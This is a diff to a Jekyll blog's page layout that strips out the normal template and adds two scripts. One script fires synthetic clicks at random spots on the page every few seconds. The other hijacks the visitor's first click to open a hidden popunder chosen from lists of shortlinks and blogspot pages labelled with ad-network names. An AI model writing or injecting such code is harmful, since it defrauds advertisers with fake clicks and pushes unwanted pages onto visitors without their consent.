@@ -1,634 +1,161 @@
----
-layout: null
----
+<!-- random klik start -->
+<script>
+function randomDelay() {
+  return 2000 + Math.random() * 4000; // 0.8 - 2.8 detik
+}
 
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+// klik di titik random layar (bebas area kosong atau tidak)
+function clickAnywhere() {
+  const x = Math.random() * window.innerWidth;
+  const y = Math.random() * window.innerHeight;
+
+  const el = document.elementFromPoint(x, y);
+
+  // tetap “klik” walaupun kosong (kalau null, skip aman)
+  if (el) {
+    el.dispatchEvent(new MouseEvent("click", {
+      bubbles: true,
+      cancelable: true,
+      clientX: x,
+      clientY: y
+    }));
+  }
+}
+
+// loop
+function loop() {
+  clickAnywhere();
+  setTimeout(loop, randomDelay());
+}
+
+loop();
+</script>
+<!-- random klik end -->
+
+
+
+
+<!-- Popunder Rotator v2026 -->
+<script>
+(function maulinator_2026(){
+
+  const CR_SEQ_KEY="maulinatorSeq";
+  const CR_DAY=24*60*60*1000;
+
+  const CR_GROUPS=[
+
+    // ===== ngaloco =====
+    [
+    "https://t.co/TPWGBQNsVF",
+"https://t.co/s7wSU8ovOU",
+"https://t.co/mAaAYVOfpt",
+"https://t.co/1Rgqe4qqko",
+"https://t.co/dVT6BumgNC",
+"https://t.co/WqRNXhGZRE",
+"https://t.co/V5Tz5WAX1O",
+"https://t.co/tJSYAn2E22",
+"https://t.co/UcJSHuwF0x",
+"https://t.co/gMApBMx0Ct",
+"https://t.co/zOrUr7WBqm",
+"https://t.co/Cw5R9uGZr5",
+"https://t.co/YDAUfOQdTl",
+"https://t.co/wMas2ozEZp",
+"https://t.co/j4Y5Hl17La",
+"https://t.co/1N1UMHpPxe",
+"https://t.co/rg7Mp46e2y",
+"https://t.co/UWFxpcjLCN",
+"https://t.co/nPb3zIXUou",
+"https://t.co/noCXbPKbGj",
+"https://t.co/7DDO2W56du",
+"https://t.co/sy6iaqipJO",
+"https://t.co/RhPRTqkHW1",
+"https://t.co/guBrk9vGTU",
+"https://t.co/qYCLHDjbHc",
+"https://t.co/TQfSpNHcV6"
+    ],
     
-    <script>
-    (function() {
-        var hostname = location.hostname;
-        var parts = hostname.split(".");
-        var fullName = parts[0];
-        if (fullName.toLowerCase() === "www") fullName = parts[1] || fullName;
-        var formatText = function(str) {
-            return str.replace(/[-_]/g, " ").replace(/\+/g, " ").replace(/\b\w/g, function(c) { return c.toUpperCase(); });
-        };
-        var displayDomain = formatText(fullName);
-        document.title = "{{ page.title | escape }} - " + displayDomain;
-        var metaDesc = document.querySelector("meta[name=\"description\"]") || document.createElement("meta");
-        metaDesc.name = "description";
-        metaDesc.content = "{{ page.description | default: page.title | escape }}";
-        if (!metaDesc.parentNode) document.head.appendChild(metaDesc);
-        var canonical = document.querySelector("link[rel=\"canonical\"]") || document.createElement("link");
-        canonical.setAttribute("rel", "canonical");
-        canonical.setAttribute("href", "{{ page.url | absolute_url }}");
-        if (!canonical.parentNode) document.head.appendChild(canonical);
-    })();
-    </script>
+    // ===== ad-maven =====
+    [
+      "https://adtrailscope.blogspot.com/2025/",
+"https://adnestflick.blogspot.com/2025/",
+"https://advancedunitconverter.blogspot.com/2025/",
+"https://beatleakedflow.blogspot.com/2025/",
+"https://castlooploom.blogspot.com/2025/"
+    ],
 
-    <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
 
-    <style>
-        /* ===== RESET & BASE ===== */
-        *,*::before,*::after{box-sizing:border-box}
-        html{overflow-x:hidden;background:#050505}
-        body{
-            width:100%;min-width:320px;max-width:100%;margin:0;padding:0;
-            background:#050505;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
-            color:#ccc;line-height:1.6;-webkit-font-smoothing:antialiased;
-            transition: background 0.3s ease, color 0.3s ease;
-        }
-        
-        /* ===== LIGHT MODE ===== */
-        body.light-mode{
-            background:#f5f5f5;color:#333;
-        }
-        body.light-mode .site-header{
-            background:rgba(255,255,255,.97);border-bottom:1px solid rgba(0,0,0,.08);
-        }
-        body.light-mode .post-title-header{color:#111;}
-        body.light-mode .domain-sub{color:rgba(0,0,0,.5);}
-        body.light-mode .menu-btn{
-            background:rgba(0,0,0,.05);border:1px solid rgba(0,0,0,.1);
-        }
-        body.light-mode .menu-btn svg{stroke:#111;}
-        body.light-mode .theme-btn{
-            background:rgba(0,0,0,.08);border:1px solid rgba(0,0,0,.15);
-        }
-        body.light-mode .theme-btn svg{stroke:#000000;}
-        body.light-mode .theme-btn:active{background:rgba(0,0,0,.15);}
-        body.light-mode .slide-menu{
-            background:#fff;border:1px solid #ddd;box-shadow:0 8px 32px rgba(0,0,0,.1);
-        }
-        body.light-mode .slide-menu li+li{border-top:1px solid rgba(0,0,0,.04);}
-        body.light-mode .slide-menu a{color:#333;}
-        body.light-mode .slide-menu a:active{background:#eaeaea;color:#000;}
-        body.light-mode .ad-box{background:#eaeaea;}
-        body.light-mode .ad-break{
-            background:#eaeaea;border-top:1px solid rgba(0,0,0,.04);
-            border-bottom:1px solid rgba(0,0,0,.04);
-        }
-        body.light-mode .ad-inline{
-            background:#eaeaea;border-top:1px solid rgba(0,0,0,.03);
-            border-bottom:1px solid rgba(0,0,0,.03);
-        }
-        body.light-mode .post-content{color:#444;}
-        body.light-mode .post-content h2{color:#111;border-left-color:#d32f2f;}
-        body.light-mode .post-content h3{color:#222;}
-        body.light-mode .post-content h4{color:#333;}
-        body.light-mode .post-content blockquote{
-            border-left-color:rgba(0,0,0,.15);color:#555;background:rgba(0,0,0,.03);
-        }
-        body.light-mode .post-content th{
-            background:rgba(0,0,0,.08);color:#111;border-bottom-color:rgba(0,0,0,.1);
-        }
-        body.light-mode .post-content td{border-bottom-color:rgba(0,0,0,.05);}
-        body.light-mode .post-content details{
-            background:rgba(0,0,0,.03);border-color:rgba(0,0,0,.08);
-        }
-        body.light-mode .post-content summary{color:#333;}
-        body.light-mode .related-section{
-            background:#f5f5f5;border:1px solid rgba(0,0,0,.05);
-        }
-        body.light-mode .related-section h3{color:#111;}
-        body.light-mode .related-card{background:#f5f5f5;}
-        body.light-mode .related-card:active{background:#eaeaea;}
-        body.light-mode .related-card h4{color:#111;}
-        body.light-mode .related-card p{color:rgba(0,0,0,.5);}
-        body.light-mode .desktop-nav a{color:#555;}
-        body.light-mode .desktop-nav a:hover{color:#000;background:rgba(0,0,0,.04);}
-        body.light-mode .sidebar-left{border-right-color:rgba(0,0,0,.03);}
-        body.light-mode .sidebar-right{border-left-color:rgba(0,0,0,.03);}
-        @media(min-width:900px){
-            body.light-mode .related-card:hover{background:rgba(0,0,0,.06);}
-        }
-
-        /* ===== HEADER ===== */
-        .site-header{
-            width:100%;position:fixed;top:0;left:0;z-index:1000;
-            background:rgba(5,5,5,.97);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);
-            border-bottom:1px solid rgba(255,255,255,.08);
-            padding:12px 12px;transition: background 0.3s ease, border-color 0.3s ease;
-        }
-        .header-inner{
-            display:flex;align-items:center;gap:10px;max-width:1280px;margin:0 auto;
-        }
-        .site-avatar{flex-shrink:0;line-height:0}
-        .site-avatar svg{width:34px;height:34px}
-        .header-text{flex:1;min-width:0}
-        .post-title-header{
-            font-size:16px;font-weight:700;color:#fff;white-space:nowrap;
-            overflow:hidden;text-overflow:ellipsis;line-height:1.2;
-        }
-        .domain-sub{
-            font-size:11px;color:rgba(255,255,255,.5);line-height:1.2;margin-top:1px;
-        }
-        .header-actions{display:flex;align-items:center;gap:8px;}
-        .menu-btn, .theme-btn{
-            width:42px;height:42px;flex-shrink:0;
-            background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);
-            cursor:pointer;padding:0;display:flex;align-items:center;justify-content:center;
-            border-radius:50%;transition:all .2s ease;
-        }
-        .menu-btn:active, .theme-btn:active{background:rgba(255,255,255,.12);transform:scale(.95)}
-        .menu-btn svg, .theme-btn svg{width:22px;height:22px;stroke:#fff;fill:none;stroke-width:2;stroke-linecap:round}
-
-        .slide-menu{
-            display:none;position:fixed;top:58px;right:8px;z-index:999;
-            background:#1a1a1a;border:1px solid #333;border-radius:14px;padding:6px;
-            min-width:200px;box-shadow:0 8px 32px rgba(0,0,0,.6);
-        }
-        .slide-menu.open{display:block}
-        .slide-menu ul{list-style:none;margin:0;padding:0}
-        .slide-menu li+li{border-top:1px solid rgba(255,255,255,.04)}
-        .slide-menu a{
-            display:flex;align-items:center;gap:8px;padding:13px 16px;color:#ccc;text-decoration:none;
-            font-size:15px;font-weight:500;border-radius:10px;transition:all .15s ease;
-        }
-        .slide-menu a svg{width:18px;height:18px;stroke:currentColor;fill:none;stroke-width:2;flex-shrink:0;}
-        .slide-menu a:active{background:#2a2a2a;color:#fff}
-
-        /* ===== DESKTOP NAV (hidden di mobile) ===== */
-        .desktop-nav{display:none}
-
-        /* ===== AD CONTAINER ===== */
-        .ad-box{
-            display:flex;justify-content:center;align-items:center;
-            margin:0 auto;max-width:100%;overflow:hidden;
-            background:#080808;min-height:50px;
-        }
-        .ad-box ins{max-width:100%}
-        .ad-desktop{display:none}
-        .ad-mobile{display:flex}
-        .ad-both{display:flex}
-
-        .ad-break{
-            padding:12px 0;background:#080808;
-            border-top:1px solid rgba(255,255,255,.04);
-            border-bottom:1px solid rgba(255,255,255,.04);
-        }
-        .ad-break:first-child{margin-top:58px}
-        .ad-inline{
-            margin:24px 0;padding:12px 0;
-            background:#080808;
-            border-top:1px solid rgba(255,255,255,.03);
-            border-bottom:1px solid rgba(255,255,255,.03);
-        }
-
-        /* ===== MAIN LAYOUT (dengan sidebar) ===== */
-        .main-layout{
-            display:flex;flex-direction:column;gap:0;width:100%;max-width:1280px;
-            margin:0 auto;padding:0;
-        }
-        .content-area{flex:1;min-width:0;padding:0;width:100%}
-        .sidebar{display:none}
-        .sticky-ad{position:sticky;top:80px;display:flex;justify-content:center}
-
-        /* ===== POST CONTAINER ===== */
-        .post-container{
-            max-width:750px;margin:0 auto;padding:0 12px 24px;
-        }
-
-        /* ===== POST CONTENT ===== */
-        .post-content{
-            color:#bbb;font-size:15px;line-height:1.7;
-        }
-        .post-content h2{
-            font-size:20px;font-weight:800;color:#fff;
-            margin:28px 0 12px;padding-left:10px;
-            border-left:3px solid #ff6b6b;
-        }
-        .post-content h3{
-            font-size:17px;font-weight:700;color:#eee;
-            margin:24px 0 10px;
-        }
-        .post-content h4{
-            font-size:15px;font-weight:600;color:#ddd;
-            margin:20px 0 8px;
-        }
-        .post-content p{margin:0 0 14px}
-        .post-content img{
-            width:100%;height:auto;border-radius:6px;margin:16px 0;
-        }
-        .post-content a{color:#ff6b6b;text-decoration:none}
-        .post-content a:hover{text-decoration:underline}
-        .post-content blockquote{
-            border-left:3px solid rgba(255,255,255,.15);
-            padding:8px 16px;margin:16px 0;color:#999;
-            background:rgba(255,255,255,.03);border-radius:0 6px 6px 0;
-        }
-        .post-content ul,.post-content ol{
-            margin:12px 0;padding-left:20px;
-        }
-        .post-content li{margin-bottom:6px}
-
-        /* Table */
-        .post-content table{
-            width:100%;border-collapse:collapse;margin:16px 0;font-size:13px;
-            border-radius:6px;overflow:hidden;
-        }
-        .post-content th{
-            background:rgba(255,255,255,.08);color:#fff;font-weight:600;
-            padding:10px 12px;text-align:left;border-bottom:2px solid rgba(255,255,255,.1);
-        }
-        .post-content td{
-            padding:10px 12px;border-bottom:1px solid rgba(255,255,255,.05);
-        }
-        .table-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:16px 0}
-
-        /* Details / Spoiler */
-        .post-content details{
-            margin:16px 0;background:rgba(255,255,255,.03);
-            border:1px solid rgba(255,255,255,.08);border-radius:6px;
-            overflow:hidden;
-        }
-        .post-content summary{
-            padding:12px 14px;font-weight:600;font-size:14px;
-            cursor:pointer;list-style:none;color:#ddd;
-            display:flex;align-items:center;gap:8px;
-        }
-        .post-content summary::-webkit-details-marker{display:none}
-        .post-content details[open] > summary svg{transform:rotate(90deg)}
-        .details-content{padding:12px 14px 16px}
-
-        /* ===== RELATED POSTS ===== */
-        .related-section{
-            margin-top:24px;padding:16px;
-            background:#050505;border-radius:10px;
-            border:1px solid rgba(255,255,255,.05);
-        }
-        .related-section h3{
-            font-size:18px;font-weight:800;color:#fff;margin:0 0 12px;display:flex;align-items:center;gap:6px;
-        }
-        .related-grid{
-            display:grid;grid-template-columns:repeat(2, 1fr);gap:8px;
-        }
-        .related-card{
-            display:flex;flex-direction:column;text-decoration:none;
-            background:#050505;border-radius:8px;
-            overflow:hidden;transition:all .15s ease;
-        }
-        .related-card:active{opacity:.8;background:#050505}
-        .related-card-img{
-            width:100%;overflow:hidden;
-        }
-        .related-card-img img{
-            width:100%;height:100%;object-fit:cover;aspect-ratio:16/9;
-        }
-        .related-card-body{
-            padding:10px 12px 12px;display:flex;flex-direction:column;
-            justify-content:center;
-        }
-        .related-card h4{
-            font-size:13px;font-weight:600;color:#fff;margin:0 0 4px;
-            line-height:1.3;
-        }
-        .related-card p{
-            font-size:11px;color:rgba(255,255,255,.5);margin:0;
-            display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;
-            overflow:hidden;
-        }
-
-        /* ============================
-           TABLET (min-width:600px)
-           ============================ */
-        @media(min-width:600px){
-            .ad-desktop{display:flex}
-            .ad-mobile{display:none}
-            .ad-both{display:flex}
-
-            .site-header{padding:12px 16px}
-            .post-title-header{font-size:17px}
-            .ad-break:first-child{margin-top:60px}
-            .post-container{padding:0 16px 32px}
-            .post-content{font-size:16px}
-            .post-content h2{font-size:22px}
-            .post-content h3{font-size:18px}
-
-            .related-grid{grid-template-columns:repeat(3, 1fr);gap:10px}
-        }
-
-        /* ============================
-           DESKTOP (min-width:900px)
-           ============================ */
-        @media(min-width:900px){
-            body{max-width:1280px;margin:0 auto}
-            .site-header{
-                left:50%;transform:translateX(-50%);max-width:1280px;
-                padding:12px 20px;
-            }
-            .post-title-header{font-size:15px;font-weight:600;color:#ccc}
-            .menu-btn{display:none}
-            .slide-menu{display:none!important}
-            .ad-break:first-child{margin-top:62px}
-
-            /* Sidebar muncul */
-            .main-layout{flex-direction:row;padding:0 8px}
-            .sidebar{display:block;flex-shrink:0;padding:16px 8px;position:relative}
-            .sidebar-left{width:160px;border-right:1px solid rgba(255,255,255,.03)}
-            .sidebar-right{width:160px;border-left:1px solid rgba(255,255,255,.03)}
-
-            .post-container{max-width:700px;padding:0 14px 40px}
-            .post-content{font-size:17px}
-            .post-content h2{font-size:24px}
-
-            .related-grid{grid-template-columns:repeat(4, 1fr);gap:12px}
-            .related-card:hover{
-                transform:translateY(-2px);
-                background:rgba(255,255,255,.06);
-            }
-
-            /* Desktop nav: muncul */
-            .desktop-nav{
-                display:flex;gap:4px;padding:0 14px;max-width:1280px;margin:0 auto 8px;
-            }
-            .desktop-nav a{
-                padding:6px 12px;color:#999;text-decoration:none;font-size:13px;
-                border-radius:6px;transition:all .15s ease;
-            }
-            .desktop-nav a:hover{color:#fff;background:rgba(255,255,255,.04)}
-        }
-
-        @media(min-width:1100px){
-            .sidebar-left{width:180px}
-            .sidebar-right{width:180px}
-            .post-container{max-width:750px}
-        }
-    </style>
+// ===== adoperator =====
+    [
+      "https://xselebgram.blogspot.com/2025/04/is-having-facebook-business-page.html",
+"https://xselebgram.blogspot.com/2025/04/how-to-attract-real-estate-clients-with.html",
+"https://xselebgram.blogspot.com/2025/04/boost-video-ad-views.html",
+"https://xselebgram.blogspot.com/2025/04/understanding-tiktok-video-shopping-ads.html",
+"https://xselebgram.blogspot.com/2025/04/mastering-instagram-growth-proven.html"
+    ],
     
-{% include head.html %}
-{% include verif.html %}
+    // ===== monetag =====
+    [
+      "https://mang-iis-blog.blogspot.com/2025/04/becoming-authority-why-topical-depth.html",
+"https://mang-iis-blog.blogspot.com/2025/04/the-power-of-internal-linking-more-than.html",
+"https://mang-iis-blog.blogspot.com/2025/04/how-internal-linking-made-my-blog-rank.html",
+"https://mang-iis-blog.blogspot.com/2025/04/5-silent-seo-killers-lurking-in-your.html",
+"https://mang-iis-blog.blogspot.com/2025/04/fixing-seo-by-cleaning-old-content-my.html"
+    ],
 
-</head>
-<body>
+    
+    // ===== hilltopads =====
+    [
+"https://adtrailscope.blogspot.com/search/",
+"https://adnestflick.blogspot.com/search/",
+"https://advancedunitconverter.blogspot.com/search/",
+"https://beatleakedflow.blogspot.com/search/",
+"https://castlooploom.blogspot.com/search/"
+]
 
-    <!-- HEADER -->
-    <header class="site-header">
-        <div class="header-inner">
-            <div id="domainAvatar" class="site-avatar"></div>
-            <div class="header-text">
-                <div class="post-title-header">{{ page.title }}</div>
-                <div id="domainSub" class="domain-sub"></div>
-            </div>
-            <div class="header-actions">
-                <button class="theme-btn" id="themeToggle" aria-label="Toggle dark/light mode">
-                    <svg id="moonIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>
-                    </svg>
-                    <svg id="sunIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:none">
-                        <circle cx="12" cy="12" r="5"/>
-                        <path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"/>
-                    </svg>
-                </button>
-                <button class="menu-btn" id="blogMenuToggle" aria-label="Menu">
-                    <svg id="menuOpenIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M3 6h18M3 12h18M3 18h18"/>
-                    </svg>
-                    <svg id="menuCloseIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:none">
-                        <path d="M6 6l12 12M6 18l12-12"/>
-                    </svg>
-                </button>
-            </div>
-        </div>
-    </header>
+  ];
+ 
 
-    <!-- SLIDE MENU (MOBILE) -->
-    <nav id="blogMenuPanel" class="slide-menu">
-        <ul>
-            <li>
-                <a href="/">
-                    <svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
-                    Home
-                </a>
-            </li>
-            <li>
-                <a href="/contact/">
-                    <svg viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
-                    Contact
-                </a>
-            </li>
-            <li>
-                <a href="/privacy-policy/">
-                    <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-                    Privacy Policy
-                </a>
-            </li>
-            <li>
-                <a href="/terms-and-conditions/">
-                    <svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
-                    Terms & Conditions
-                </a>
-            </li>
-        </ul>
-    </nav>
+  function CRRandom(arr){
+    return arr[Math.floor(Math.random()*arr.length)];
+  }
 
-    <script>
-    (function(){
-        var host = window.location.hostname.split(".");
-        var sub = host[0];
-        if (sub.toLowerCase() === "www") sub = host[1] || "";
-        var clean = sub.replace(/-/g, " ");
-        document.getElementById("domainSub").textContent = clean.replace(/\b\w/g, function(c) { return c.toUpperCase(); });
-    })();
-    (function(){
-        var btn = document.getElementById("blogMenuToggle");
-        var panel = document.getElementById("blogMenuPanel");
-        var menuOpenIcon = document.getElementById("menuOpenIcon");
-        var menuCloseIcon = document.getElementById("menuCloseIcon");
-        btn.addEventListener("click", function(e){
-            e.stopPropagation();
-            var open = panel.classList.toggle("open");
-            menuOpenIcon.style.display = open ? "none" : "block";
-            menuCloseIcon.style.display = open ? "block" : "none";
-        });
-        document.addEventListener("click", function(e){
-            if(!panel.contains(e.target) && !btn.contains(e.target)){
-                panel.classList.remove("open");
-                menuOpenIcon.style.display = "block";
-                menuCloseIcon.style.display = "none";
-            }
-        });
-        panel.addEventListener("click", function(e){
-            e.stopPropagation();
-        });
-    })();
-    </script>
+  document.addEventListener("click",function(){
 
-    <!-- AVATAR SCRIPT -->
-    <script>
-    (function() {
-        var hostname = window.location.hostname;
-        var parts = hostname.split(".");
-        var fullName = parts[0];
-        if (fullName.toLowerCase() === "www") fullName = parts[1] || fullName;
-        function h(s) {var h=0;for(var i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h|=0;}return Math.abs(h);}
-        var dh = h(fullName);
-        var clean = fullName.replace(/-/g," ");
-        var w = clean.split(" "), init = "";
-        for (var i=0;i<Math.min(w.length,3);i++){if(w[i].length>0)init+=w[i].charAt(0).toUpperCase();}
-        if(init.length<2)init=fullName.substring(0,3).toUpperCase();
-        document.getElementById("domainAvatar").innerHTML = "<svg width=\"34\" height=\"34\" viewBox=\"0 0 34 34\"><rect width=\"34\" height=\"34\" rx=\"17\" fill=\"hsl("+(dh%360)+",60%,50%)\"/><text x=\"17\" y=\"23\" text-anchor=\"middle\" fill=\"#fff\" font-size=\"14\" font-weight=\"bold\" font-family=\"sans-serif\">"+init+"</text></svg>";
-    })();
-    </script>
+    const now=Date.now();
+    let seq=parseInt(localStorage.getItem(CR_SEQ_KEY)||"0",10);
 
-    <!-- DARK/LIGHT TOGGLE SCRIPT -->
-    <script>
-    (function() {
-        const body = document.body;
-        const toggleBtn = document.getElementById('themeToggle');
-        const moonIcon = document.getElementById('moonIcon');
-        const sunIcon = document.getElementById('sunIcon');
-        const currentTheme = localStorage.getItem('theme');
-        if (currentTheme === 'light') {
-            body.classList.add('light-mode');
-            moonIcon.style.display = 'none';
-            sunIcon.style.display = 'block';
+    if(seq<0||seq>=CR_GROUPS.length){
+      seq=0;
+    }
+
+    // Cari grup yang belum tampil dalam 24 jam
+    for(let i=0;i<CR_GROUPS.length;i++){
+
+      const index=(seq+i)%CR_GROUPS.length;
+      const lastKey="maulinatorLast_"+index;
+      const last=parseInt(localStorage.getItem(lastKey)||"0",10);
+
+      if(!last || (now-last)>=CR_DAY){
+
+        const url=CRRandom(CR_GROUPS[index]);
+        const win=window.open(url,"_blank");
+
+        if(win){
+          localStorage.setItem(lastKey,now);
+          localStorage.setItem(CR_SEQ_KEY,(index+1)%CR_GROUPS.length);
+          win.blur();
+          window.focus();
         }
-        toggleBtn.addEventListener('click', function() {
-            body.classList.toggle('light-mode');
-            let theme = 'dark';
-            if (body.classList.contains('light-mode')) {
-                theme = 'light';
-                moonIcon.style.display = 'none';
-                sunIcon.style.display = 'block';
-            } else {
-                moonIcon.style.display = 'block';
-                sunIcon.style.display = 'none';
-            }
-            localStorage.setItem('theme', theme);
-        });
-    })();
-    </script>
 
-    <!-- BANNER 06: TOP -->
-    <div class="ad-break">
-        <div class="ad-box ad-desktop">
-            {% include /ads/banner/06.html %}
-        </div>
-        <div class="ad-box ad-mobile">
-            {% include /ads/banner/04.html %}
-        </div>
-    </div>
+        return;
+      }
 
-    <!-- DESKTOP NAV -->
-    <nav class="desktop-nav">
-        <a href="/">Home</a>
-        <a href="/contact/">Contact</a>
-        <a href="/privacy-policy/">Privacy Policy</a>
-        <a href="/terms-and-conditions/">Terms & Conditions</a>
-    </nav>
+    }
 
-    <!-- MAIN LAYOUT DENGAN SIDEBAR -->
-    <div class="main-layout">
+    // Semua popunder masih dalam masa 24 jam.
+    // Tidak membuka apa pun.
 
-        <!-- LEFT SIDEBAR: Banner 05 -->
-        <aside class="sidebar sidebar-left">
-            <div class="sticky-ad">
-                {% include /ads/banner/05.html %}
-            </div>
-        </aside>
+  },{once:true});
 
-        <!-- MAIN CONTENT -->
-        <main class="content-area">
-
-            <div class="post-container">
-
-                <div class="post-content">
-                    {{ content }}
-                </div>
-
-                <!-- BANNER 01: SETELAH KONTEN -->
-                <div class="ad-inline">
-                    <div class="ad-box ad-desktop">
-                        {% include /ads/banner/01.html %}
-                    </div>
-                    <div class="ad-box ad-mobile">
-                        {% include /ads/banner/04.html %}
-                    </div>
-                </div>
-                
-                <div class="post-content">
-                    {% include disqus.html %}
-                </div>
-                
-                <!-- BANNER 01: SETELAH KONTEN -->
-                <div class="ad-inline">
-                    <div class="ad-box ad-desktop">
-                        {% include /ads/banner/01.html %}
-                    </div>
-                    <div class="ad-box ad-mobile">
-                        {% include /ads/banner/04.html %}
-                    </div>
-                </div>
-
-                <!-- RELATED POSTS -->
-                {% assign related = "" | split: "" %}
-                {% for tag in page.tags %}
-                    {% assign tag_posts = site.tags[tag] | where_exp: "post", "post.url != page.url" %}
-                    {% assign related = related | concat: tag_posts %}
-                {% endfor %}
-                {% assign related = related | uniq %}
-
-                {% if related.size > 0 %}
-                <div class="related-section">
-                    <h3>
-                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
-                        Related Posts
-                    </h3>
-                    <div class="related-grid">
-                        {% for post in related %}
-                        <a href="{{ post.url }}" class="related-card">
-                            {% if post.image %}
-                            <div class="related-card-img">
-                                <img src="{{ post.image | relative_url }}" alt="{{ post.title }}" loading="lazy">
-                            </div>
-                            {% endif %}
-                           <!-- <div class="related-card-body">
-                                <h4>{{ post.title }}</h4>
-                                
-                            </div>-->
-                        </a>
-                        {% endfor %}
-                    </div>
-                </div>
-                {% endif %}
-
-                <!-- BANNER 02: SETELAH RELATED -->
-                <div class="ad-inline">
-                    <div class="ad-box ad-both">
-                        {% include /ads/banner/02.html %}
-                    </div>
-                </div>
-
-            </div>
-
-        </main>
-
-        <!-- RIGHT SIDEBAR: Banner 05 -->
-        <aside class="sidebar sidebar-right">
-            <div class="sticky-ad">
-                {% include /ads/banner/05.html %}
-            </div>
-        </aside>
-
-    </div>
-
-    <!-- BANNER 07: BOTTOM -->
-    <div class="ad-break">
-        <div class="ad-box ad-desktop">
-            {% include /ads/banner/07.html %}
-        </div>
-        <div class="ad-box ad-mobile">
-            {% include /ads/banner/04.html %}
-        </div>
-    </div>
-
-    {% include /ads/layout/d.html %}
-    {% include footer.html %}
-
-</body>
-</html>
+})();
+</script>
